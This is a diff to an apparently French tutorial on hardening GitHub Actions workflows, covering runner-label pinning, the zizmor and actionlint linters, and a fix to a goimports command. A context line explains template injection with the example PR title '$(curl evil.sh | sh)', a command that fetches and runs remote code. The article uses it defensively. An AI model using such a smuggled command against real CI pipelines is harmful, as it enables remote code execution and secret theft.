@@ -112,7 +112,7 @@ runs-on: ubuntu-latest
 runs-on: ubuntu-24.04
 ```
 
-Renovate a un manager `github-runners` qui suit ces labels comme le reste, donc le pin ne fige rien : il transforme juste une migration subie en PR qu'on relit.
+On nomme la version que `-latest` désigne aujourd'hui, pas la plus récente qui existe : `ubuntu-26.04` est disponible mais en preview, alors que `ubuntu-latest` reste sur 24.04. Côté macOS c'est l'inverse du réflexe, `macos-latest` pointe déjà sur macOS 26, donc écrire `macos-15` downgraderait le runner sans le dire. Renovate a un manager `github-runners` qui suit ces labels comme le reste, donc le pin ne fige rien : il transforme juste une migration subie en PR qu'on relit.
 
 ### zizmor : le linter de tes workflows
 
@@ -158,7 +158,7 @@ Le finding qui mérite un exemple, c'est *template injection*. `${{ }}` est une 
 
 Une PR titrée `$(curl evil.sh | sh)` s'exécute donc dans le premier cas, et bash n'a aucun moyen de savoir d'où vient la valeur. En passant par `env:`, le contenu reste une chaîne, quoi qu'il y ait dedans.
 
-zizmor a un angle mort symétrique : il lit le workflow, pas le shell qu'il contient. [actionlint](https://github.com/rhysd/actionlint) complète en passant chaque bloc `run:` à shellcheck, et en validant au passage les labels de runner, les `needs:` qui pointent vers un job inexistant et les expressions `${{ }}` mal typées. Les deux se recouvrent sur l'injection de template, ce qui n'est pas plus mal.
+zizmor a un angle mort symétrique : il lit le workflow, pas le shell qu'il contient. [actionlint](https://github.com/rhysd/actionlint) complète en passant chaque bloc `run:` à shellcheck, et en validant au passage les labels de runner, les `needs:` qui pointent vers un job inexistant et les expressions `${{ }}` mal typées. Son premier passage sur `gopen` a d'ailleurs sorti un `goimports -w $(find . -name '*.go')` qui se casse au premier fichier contenant une espace, corrigé en `find … -exec goimports -w {} +` dans le workflow plus bas.
 
 ## Test et build multi-plateforme
 
@@ -183,7 +183,7 @@ jobs:
     runs-on: ${{ matrix.os }}
     strategy:
       matrix:
-        os: [ubuntu-24.04, macos-15, windows-2025]
+        os: [ubuntu-24.04, macos-26, windows-2025]
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
@@ -356,7 +356,7 @@ jobs:
           # renovate: datasource=go depName=golang.org/x/tools
           GOIMPORTS_VERSION: v0.48.0
         run: go install "golang.org/x/tools/cmd/goimports@${GOIMPORTS_VERSION}"
-      - run: goimports -w $(find . -name '*.go')
+      - run: find . -name '*.go' -exec goimports -w {} +
       - uses: reviewdog/action-suggester@2558ba17e65a9039e73764a73009fc05fef28a46 # v1.24.3
         with:
           tool_name: goimports
